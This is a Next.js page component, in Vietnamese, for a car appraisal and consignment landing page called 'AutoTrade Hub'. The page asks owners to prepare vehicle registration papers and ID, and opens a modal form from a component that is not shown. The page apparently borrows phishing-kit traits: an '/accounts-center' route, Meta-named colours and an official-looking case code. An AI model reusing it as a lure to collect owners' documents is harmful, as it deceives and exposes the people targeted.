import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "AutoTrade Hub | Đăng Ký Thẩm Định & Ký Gửi Xe",
  description: "Cổng đăng ký kiểm định chất lượng, định giá xe cũ và kết nối người mua chính chủ.",
  alternates: {
    canonical: "/accounts-center",
  },
};

export default function AccountsCenterPage() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
        <main className="mx-auto flex min-h-screen max-w-4xl flex-col px-4 py-10 sm:px-8">
          <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
            <div className="mb-6 flex items-start gap-4 sm:mb-10">
              <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                <Image
                  src="/ic_blue.svg"
                  alt="Vehicle Appraisal"
                  width={40}
                  height={40}
                  className="h-8 w-8"
                />
              </div>
              <div>
                <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
                  Yêu Cầu Định Giá &amp; Đăng Ký Mua Bán Xe
                </h1>
                <p className="mt-2 text-sm font-semibold text-slate-800">
                  Dịch vụ kiểm định chất lượng 160 điểm và hỗ trợ giao dịch xe chính chủ nhanh chóng.
                </p>
              </div>
            </div>

            <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
              <p>
                Để đảm bảo tính minh bạch và an toàn pháp lý cho mọi giao dịch trên hệ thống sàn giao dịch ô tô, tất cả các phương tiện đăng bán hoặc ký gửi đều được kiểm tra hồ sơ kỹ thuật, lịch sử bảo dưỡng và tình trạng pháp lý xe trước khi kết nối trực tiếp với người mua thiện chí.
              </p>

              <p>
                Hoàn tất hồ sơ kiểm định giúp xe của bạn được định giá sát nhất với thị trường thực tế, cấp chứng nhận xe đạt chuẩn và tăng tốc độ thanh khoản lên đến 70% so với việc tự rao bán riêng lẻ.
              </p>

              <p className="mt-4 text-sm font-medium text-metaBlue">
                Mã Hồ Sơ Thẩm Định: <span className="underline decoration-dotted">#CAR-2026-VAL-8821</span>
              </p>

              <div className="mt-6 space-y-3">
                <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
                  Quy Trình Kiểm Tra &amp; Điều Kiện Hồ Sơ
                </h2>

                <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
                  <li>
                    • <strong>Thông Tin Pháp Lý:</strong> Chủ xe chuẩn bị sẵn bản sao cà-vẹt (giấy đăng ký xe), sổ đăng kiểm còn hạn và giấy tờ tùy thân của người đứng tên để đối chiếu tính chính chủ.
                  </li>

                  <li>
                    • <strong>Khảo Sát Thực Tế:</strong> Chuyên viên kỹ thuật sẽ đặt lịch kiểm tra trực tiếp khung gầm, động cơ, hộp số và lịch sử tai nạn/thủy kích theo tiêu chuẩn 160 hạng mục tại nhà hoặc trạm dịch vụ.
                  </li>

                  <li>
                    • <strong>Định Giá &amp; Khớp Lệnh Mua:</strong> Báo cáo kiểm định và mức giá đề xuất tốt nhất sẽ được gửi lại trong vòng 2–4 giờ làm việc. Sau khi thống nhất giá, thủ tục công chứng và giải ngân được hoàn tất ngay trong ngày.
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-10 flex justify-center">
              <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
                Đăng Ký Định Giá Ngay
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
            <button className="hover:text-slate-700" type="button">
              Bảng Giá Tham Khảo
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Chính Sách Bảo Hành Xe
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Hỗ Trợ Thủ Tục Sang Tên
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Hợp Đồng Ký Gửi
            </button>
            <span className="text-slate-400">|</span>
            <span>AutoTrade Hub © 2026</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}